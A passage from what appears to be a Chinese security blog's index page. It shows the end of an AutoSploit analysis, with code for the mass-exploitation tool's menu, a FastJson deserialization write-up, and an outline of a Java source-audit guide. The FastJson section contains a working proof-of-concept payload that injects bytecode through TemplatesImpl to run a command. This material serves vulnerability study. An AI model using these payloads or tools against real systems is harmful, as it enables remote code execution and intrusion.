targets(True)</span><br><span class="line">                else:</span><br><span class="line">                    append = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Append hosts to file or overwrite? [A/O]: &quot;).lower()</span><br><span class="line"></span><br><span class="line">                    if append == &#x27;a&#x27;:</span><br><span class="line">                        targets(False)</span><br><span class="line">                    elif append == &#x27;o&#x27;:</span><br><span class="line">                        targets(True)</span><br><span class="line">                    else:</span><br><span class="line">                        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;3&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line"></span><br><span class="line">                else:</span><br><span class="line">                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Printing hosts...\n\n&quot;</span><br><span class="line">                    time.sleep(2)</span><br><span class="line"></span><br><span class="line">                    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as infile:</span><br><span class="line">                        for line in infile:</span><br><span class="line">                            print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line</span><br><span class="line"></span><br><span class="line">                    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Done.\n&quot;</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;4&#x27;:</span><br><span class="line">                if not os.path.isfile(&quot;hosts.txt&quot;):</span><br><span class="line">                    print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. AutoSploit failed to detect host file.&quot;</span><br><span class="line">                    print &quot;Please make sure to gather a list of targets&quot;</span><br><span class="line">                    print &quot;by selecting the &#x27;Gather Hosts&#x27; option&quot;</span><br><span class="line">                    print &quot;before executing the &#x27;Exploit&#x27; module.&quot;</span><br><span class="line"></span><br><span class="line">                if configured == True:</span><br><span class="line">                    exploit(query)</span><br><span class="line">                elif configured == False:</span><br><span class="line">                    settings()</span><br><span class="line"></span><br><span class="line">            elif action == &#x27;5&#x27;:</span><br><span class="line">                print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Exiting AutoSploit...&quot;</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option.&quot;</span><br><span class="line"></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. User aborted.&quot;</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Initializing AutoSploit...&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]One moment please while we check the Postgresql and Apache services...\n&quot;</span><br><span class="line"></span><br><span class="line">    postgresql = cmdline(&quot;sudo service postgresql status | grep active&quot;)</span><br><span class="line">    if &quot;Active: inactive&quot; in postgresql:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Postgresql Service is offline&quot;</span><br><span class="line"></span><br><span class="line">        start_pst = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Postgresql Service? [Y]es/[N]o: &quot;).lower()</span><br><span class="line">        if start_pst == &#x27;y&#x27;:</span><br><span class="line">            os.system(&quot;sudo service postgresql start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">        elif start_pst == &#x27;n&#x27;:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;</span><br><span class="line">            os.system(&quot;sudo service postgresql start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Postgresql Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    apache = cmdline(&quot;service apache2 status | grep active&quot;)</span><br><span class="line">    if &quot;Active: inactive&quot; in apache:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Warning. Heuristics indicate Apache Service is offline&quot;</span><br><span class="line"></span><br><span class="line">        start_ap = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Start Apache Service? [Y]es/[N]o: &quot;).lower()</span><br><span class="line">        if start_ap == &#x27;y&#x27;:</span><br><span class="line">            os.system(&quot;sudo service apache2 start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">        elif start_ap == &#x27;n&#x27;:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]AutoSploit&#x27;s MSF related operations require this service to be active.&quot;</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Aborted.&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to starting the service.&quot;</span><br><span class="line">            os.system(&quot;sudo service apache2 start&quot;)</span><br><span class="line"></span><br><span class="line">            print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Apache2 Service Started...&quot;</span><br><span class="line">            time.sleep(1.5)</span><br><span class="line"></span><br><span class="line">    # We will check if the shodan api key has been saved before, if not we are going to prompt</span><br><span class="line">    # for it and save it to a file</span><br><span class="line">    if not os.path.isfile(&quot;api.p&quot;):</span><br><span class="line">        print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your Shodan.io API key.&quot;</span><br><span class="line"></span><br><span class="line">        SHODAN_API_KEY = raw_input(&quot;API key: &quot;)</span><br><span class="line">        pickle.dump(SHODAN_API_KEY, open(&quot;api.p&quot;, &quot;wb&quot;))</span><br><span class="line"></span><br><span class="line">        path = os.path.abspath(&quot;api.p&quot;)</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]\nYour API key has been saved to &quot; + path</span><br><span class="line"></span><br><span class="line">        main()</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            SHODAN_API_KEY = pickle.load(open(&quot;api.p&quot;, &quot;rb&quot;))</span><br><span class="line">        except IOError as e:</span><br><span class="line">            print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An IO error was raised while attempting to read API data.&quot;</span><br><span class="line">            print e</span><br><span class="line"></span><br><span class="line">        path = os.path.abspath(&quot;api.p&quot;)</span><br><span class="line">        print &quot;\n[&quot; + t.green(&quot;+&quot;) + &quot;]Your API key was loaded from &quot; + path</span><br><span class="line"></span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>



                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Jan 20 2018 21:00:00 GMT+0800">2018-01-20</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/AutoSploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/FastJson%20Unserialization/">
                        FastJson Unserialization
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        漏洞公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315

0x00 关于漏洞漏洞公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315
0x01 POC分析参考的网上的POC
POC
1234567891011121314public class FastJsonPoc extends AbstractTranslet &#123;    public FastJsonPocCls() throws IOException &#123;        Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;    &#125;    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        FastJsonPocC t = new FastJsonPocC();    &#125;&#125;

DEMO
123456789101112131415161718192021222324252627282930public class FastjsonVulTest &#123;    public static String readClass(String cls)&#123;        ByteArrayOutputStream bos = new ByteArrayOutputStream();        try &#123;            IOUtils.copy(new FileInputStream(new File(cls)), bos);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        byte[] aa = bos.toByteArray();        return Base64.encodeBase64String(bos.toByteArray());    &#125;    public static void test_autoTypeDeny()&#123;        String clsPath = &quot;/Users/****/src/main/java/com/alibaba/middleware/FastJsonPocC.class&quot;;        String evilCode = readClass(clsPath);        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String testJson = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;;        Object obj = JSON.parseObject(testJson, Object.class, Feature.SupportNonPublicField);    &#125;    public static void main(String args[])&#123;        try &#123;            test_autoTypeDeny();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

String testJson = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +                 &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;;
将JSONString转换成@type指定的TemplatesImpl类,即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
_bytecodes是恶意利用代码的字节码（FastJsonPoc）
设置了4个属性和对应的值：_bytecodes、_name、_tfactory和_outputProperties
通过查看TemplatesImpl的代码发现，_tfactory和_outputProperties属性没有对应getter／setter方法
_bytecodes

_name

fastjson会在new TemplatesImpl实例并调用其空参构造函数之后，会依次遍历JSONString中设置的属性和值，并按顺序执行set&#123;属性名&#125;／get&#123;属性名&#125;的方法，如果不存在对应该格式的方法(get之后的第一个字母大写跟叔姓名)，则直接对该对象对应的属性值进行赋值
所以当fastjson发现在TemplatesImpl中找不到setBytecodes()/getBytecodes()方法时，会直接对TemplatesImpl中的_bytecodes属性强赋值，而不会去调用代码里面定义的setTransletBytecodes()/getTransletBytecodes()
这样来看，_name和_tfactory属性的setter/getter方法的格式是不对的，因此又被fastjson强赋值，但是当遍历到_outputProperties属性时，发现存在一个getOutputProperties()方法（然而这个方法并不是_outputProperties方法的get方法），fastjson会立即执行调用该方法
（*上边这部分全靠参考大佬的文章才理解，不过不公开，在这说明下）*
在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化
0x02 代码分析getOutputProperties()
newTransformer()

getTransletInstance()

AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
对外部传入的java字节码生成的Class对象进行实例化，此处会调用该对象的构造函数，将触发自定义的代码
getTransletInstance()

1234if (_bytecodes == null) &#123;          ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);          throw new TransformerConfigurationException(err.toString());      &#125;
_bytecodes就是JSONString传入的字节码
123for (int i = 0; i &lt; classCount; i++) &#123;                _class[i] = loader.defineClass(_bytecodes[i]);                final Class superClass = _class[i].getSuperclass();
将_bytecodes（外部传入的字节码）还原成class对象，执行Runtime.getRuntime.exec()
参考：http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/https://github.com/alibaba/fastjson/wiki/security_update_20170315

                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>漏洞公告：<code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211165369284.jpg"></p>
<h4 id="0x00-关于漏洞"><a href="#0x00-关于漏洞" class="headerlink" title="0x00 关于漏洞"></a>0x00 关于漏洞</h4><p>漏洞公告：<code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
<h4 id="0x01-POC分析"><a href="#0x01-POC分析" class="headerlink" title="0x01 POC分析"></a>0x01 POC分析</h4><p><em>参考的网上的POC</em></p>
<p><code>POC</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class FastJsonPoc extends AbstractTranslet &#123;</span><br><span class="line">    public FastJsonPocCls() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        FastJsonPocC t = new FastJsonPocC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DEMO</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class FastjsonVulTest &#123;</span><br><span class="line"></span><br><span class="line">    public static String readClass(String cls)&#123;</span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        try &#123;</span><br><span class="line">            IOUtils.copy(new FileInputStream(new File(cls)), bos);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] aa = bos.toByteArray();</span><br><span class="line">        return Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void test_autoTypeDeny()&#123;</span><br><span class="line">        String clsPath = &quot;/Users/****/src/main/java/com/alibaba/middleware/FastJsonPocC.class&quot;;</span><br><span class="line">        String evilCode = readClass(clsPath);</span><br><span class="line">        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">        String testJson = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +</span><br><span class="line">                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(testJson, Object.class, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String args[])&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>String testJson = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +                 &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;;</code></p>
<p>将<code>JSONString</code>转换成<code>@type</code>指定的<code>TemplatesImpl</code>类,即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p><code>_bytecodes</code>是恶意利用代码的字节码（FastJsonPoc）</p>
<p>设置了4个属性和对应的值：<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>和<code>_outputProperties</code></p>
<p>通过查看<code>TemplatesImpl</code>的代码发现，<code>_tfactory</code>和<code>_outputProperties</code>属性没有对应<code>getter／setter</code>方法</p>
<p><code>_bytecodes</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211867288350.jpg"></p>
<p><code>_name</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211867591795.jpg"></p>
<p><code>fastjson会在new TemplatesImpl实例并调用其空参构造函数之后，会依次遍历JSONString中设置的属性和值，并按顺序执行set&#123;属性名&#125;／get&#123;属性名&#125;的方法，如果不存在对应该格式的方法(get之后的第一个字母大写跟叔姓名)，则直接对该对象对应的属性值进行赋值</code></p>
<p>所以当<code>fastjson</code>发现在<code>TemplatesImpl</code>中找不到<code>setBytecodes()/getBytecodes()</code>方法时，会直接对<code>TemplatesImpl</code>中的<code>_bytecodes</code>属性强赋值，而不会去调用代码里面定义的<code>setTransletBytecodes()/getTransletBytecodes()</code></p>
<p>这样来看，<code>_name</code>和<code>_tfactory</code>属性的<code>setter/getter</code>方法的格式是不对的，因此又被<code>fastjson</code>强赋值，但是当遍历到<code>_outputProperties</code>属性时，发现存在一个<code>getOutputProperties()</code>方法（然而这个方法并不是<code>_outputProperties</code>方法的get方法），<code>fastjson</code>会立即执行调用该方法</p>
<p>（*<del>上边这部分全靠参考大佬的文章才理解，不过不公开，在这说明下）</del>*</p>
<p>在默认情况下，<code>fastjson</code>只会反序列化公开的属性和域，而<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中<code>_bytecodes</code>却是私有属性，<code>_name</code>也是私有域，所以在<code>parseObject</code>的时候需要设置<code>Feature.SupportNonPublicField</code>，这样<code>_bytecodes</code>字段才会被反序列化</p>
<h4 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h4><p><code>getOutputProperties()</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211872186651.jpg"><br><code>newTransformer()</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211873011287.jpg"></p>
<p><code>getTransletInstance()</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211873886624.jpg"></p>
<p><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></p>
<p>对外部传入的java字节码生成的Class对象进行实例化，此处会调用该对象的构造函数，将触发自定义的代码</p>
<p><code>getTransletInstance()</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15211882049104.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (_bytecodes == null) &#123;</span><br><span class="line">          ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">          throw new TransformerConfigurationException(err.toString());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p><code>_bytecodes</code>就是<code>JSONString</code>传入的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br></pre></td></tr></table></figure>
<p>将<code>_bytecodes</code>（外部传入的字节码）还原成<code>class</code>对象，执行<code>Runtime.getRuntime.exec()</code></p>
<p>参考：<a class="link" target="_blank" rel="noopener" href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat Dec 30 2017 21:00:00 GMT+0800">2017-12-30</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/FastJson%20Unserialization/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Java%20Web%20%E5%B7%A5%E7%A8%8B%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%A6%82%E7%95%A5/">
                        Java Web 工程源码安全审计概略
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        
0x00 框架基础0x0a 常见框架0x0b Servlet0x0c SpringMVC0x0d Spring Boot0x0e 其它0x01 面对单个应用0x0a 明确需求0x0b 确定框架0x0c 文件结构0x0d 运行流程0x0e 关键代码审计0x0f checklist + 黑盒0x03 权限控制风险0x04 其它常规漏洞0x05 面对十几万行代码更新0x0a 文件过滤0x0b 风险打标0x0c 逻辑挖掘0x0d 黑盒验证0x05 总结
                    
                </div> -->
                <div class="article-content markdown-body">
                    <p><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%871.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%872.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%873.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%874.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%875.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%876.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%877.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%878.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%879.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8710.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8711.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8712.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8713.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8714.png"><br><img lazyload src="/images/loading.svg" data-src="%E5%B9%BB%E7%81%AF%E7%89%8715.png"><br><img lazyload src="/images/loading.svg" data-src="SpringBoot%E5%90%AF%E5%8A%A8.png"></p>
<h3 id="0x00-框架基础"><a href="#0x00-框架基础" class="headerlink" title="0x00 框架基础"></a>0x00 框架基础</h3><h4 id="0x0a-常见框架"><a href="#0x0a-常见框架" class="headerlink" title="0x0a 常见框架"></a>0x0a 常见框架</h4><h4 id="0x0b-Servlet"><a href="#0x0b-Servlet" class="headerlink" title="0x0b Servlet"></a>0x0b Servlet</h4><h4 id="0x0c-SpringMVC"><a href="#0x0c-SpringMVC" class="headerlink" title="0x0c SpringMVC"></a>0x0c SpringMVC</h4><h4 id="0x0d-Spring-Boot"><a href="#0x0d-Spring-Boot" class="headerlink" title="0x0d Spring Boot"></a>0x0d Spring Boot</h4><h4 id="0x0e-其它"><a href="#0x0e-其它" class="headerlink" title="0x0e 其它"></a>0x0e 其它</h4><h3 id="0x01-面对单个应用"><a href="#0x01-面对单个应用" class="headerlink" title="0x01 面对单个应用"></a>0x01 面对单个应用</h3><h4 id="0x0a-明确需求"><a href="#0x0a-明确需求" class="headerlink" title="0x0a 明确需求"></a>0x0a 明确需求</h4><h4 id="0x0b-确定框架"><a href="#0x0b-确定框架" class="headerlink" title="0x0b 确定框架"></a>0x0b 确定框架</h4><h4 id="0x0c-文件结构"><a href="#0x0c-文件结构" class="headerlink" title="0x0c 文件结构"></a>0x0c 文件结构</h4><h4 id="0x0d-运行流程"><a href="#0x0d-运行流程" class="headerlink" title="0x0d 运行流程"></a>0x0d 运行流程</h4><h4 id="0x0e-关键代码审计"><a href="#0x0e-关键代码审计" class="headerlink" title="0x0e 关键代码审计"></a>0x0e 关键代码审计</h4><h4 id="0x0f-checklist-黑盒"><a href="#0x0f-checklist-黑盒" class="headerlink" title="0x0f checklist + 黑盒"></a>0x0f checklist + 黑盒</h4><h3 id="0x03-权限控制风险"><a href="#0x03-权限控制风险" class="headerlink" title="0x03 权限控制风险"></a>0x03 权限控制风险</h3><h3 id="0x04-其它常规漏洞"><a href="#0x04-其它常规漏洞" class="headerlink" title="0x04 其它常规漏洞"></a>0x04 其它常规漏洞</h3><h3 id="0x05-面对十几万行代码更新"><a href="#0x05-面对十几万行代码更新" class="headerlink" title="0x05 面对十几万行代码更新"></a>0x05 面对十几万行代码更新</h3><h4 id="0x0a-文件过滤"><a href="#0x0a-文件过滤" class="headerlink" title="0x0a 文件过滤"></a>0x0a 文件过滤</h4><h4 id="0x0b-风险打标"><a href="#0x0b-风险打标" class="headerlink" title="0x0b 风险打标"></a>0x0b 风险打标</h4><h4 id="0x0c-逻辑挖掘"><a href="#0x0c-逻辑挖掘" class="headerlink" title="0x0c 逻辑挖掘"></a>0x0c 逻辑挖掘</h4><h4 id="0x0d-黑盒验证"><a href="#0x0d-黑盒验证" class="headerlink" title="0x0d 黑盒验证"></a>0x0d 黑盒验证</h4><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3>
                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Dec 29 2017 21:00:00 GMT+0800">2017-12-29</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
